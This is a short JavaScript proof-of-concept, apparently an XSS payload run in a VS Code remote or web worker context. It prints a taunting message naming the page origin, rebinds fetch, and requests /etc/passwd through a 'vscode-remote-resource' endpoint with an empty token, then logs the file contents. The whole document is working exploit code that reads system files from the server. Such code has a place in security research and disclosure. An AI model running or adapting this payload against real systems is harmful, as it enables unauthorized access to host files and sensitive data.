console.dir("Shirley: Hey sudi, I love you , here is your XSS in " + origin)
globalThis.fetch = WorkerGlobalScope.prototype.fetch.bind(globalThis)

async function exploit() {
    const page_resp = await fetch("/oss-6a96d5dc452450b1ad67667c4e503a014ef0a908/vscode-remote-resource?path=/etc/passwd&tkn=")
    const text = await page_resp.text()
    console.dir(text)
    }
exploit()
